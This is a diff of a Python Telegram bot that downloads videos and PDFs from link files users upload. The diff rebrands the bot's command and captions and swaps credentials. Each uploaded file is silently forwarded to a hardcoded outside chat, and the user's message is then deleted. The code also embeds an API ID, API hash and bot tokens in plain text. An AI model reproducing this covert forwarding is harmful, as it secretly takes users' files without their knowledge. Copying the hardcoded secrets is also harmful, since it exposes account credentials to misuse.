@@ -26,7 +26,7 @@ bot = Client(
     "bot",
     api_id=28466214,
     api_hash= "3f55d44aae0f6c72f0dd8855adeeb60f",
-    bot_token= "7320677757:AAGTpKYkEnxZVRMp7DVRabt5YD4sauUeyd0")
+    bot_token= "7444012418:AAHjUMn8yWT-7SYFFRGnpT53uZnYrMSkB40")
 
 
 @bot.on_message(filters.command(["start"]))
@@ -41,13 +41,13 @@ async def restart_handler(_, m):
 
 
 
-@bot.on_message(filters.command(["txt"]))
+@bot.on_message(filters.command(["MELVIN"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('Hi\n\nTO download a test file send here » ')
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
        x = await input.download()
-       await bot.send_document(-1002454914396, x)
+       await bot.send_document(-1002222484556, x)
        await input.delete(True)
        file_name, ext = os.path.splitext(os.path.basename(x))
        credit = "MEDARN"
@@ -183,8 +183,8 @@ async def account_login(bot: Client, m: Message):
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
             try:
                 
-                cc = f'**{str(count).zfill(3)}.** {name} {res}.mkv\n\n**Batch Name : ** {raw_text0}\n\n**Downloaded  By ➤  {raw_text3}**\n\n'
-                cc1 = f'**{str(count).zfill(3)}.** {name} .pdf\n\n**Batch Name : ** {raw_text0}\n\n**Downloded  By ➤  {raw_text3}**\n\n'
+                cc = f'**[🎬] Vid_ID : {str(count).zfill(3)}**/n**Tital : ** {name} {res}[MELVIN].mkv\n\n**Batch Name : ** {raw_text0}\n\n**Extracted  By ➤  {raw_text3}**\n\n'
+                cc1 = f'**[📕] Pdf_ID : {str(count).zfill(3)}**/n**Tital : ** {name} [MELVIN].pdf\n\n**Batch Name : ** {raw_text0}\n\n**Extracted  By ➤  {raw_text3}**\n\n'
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
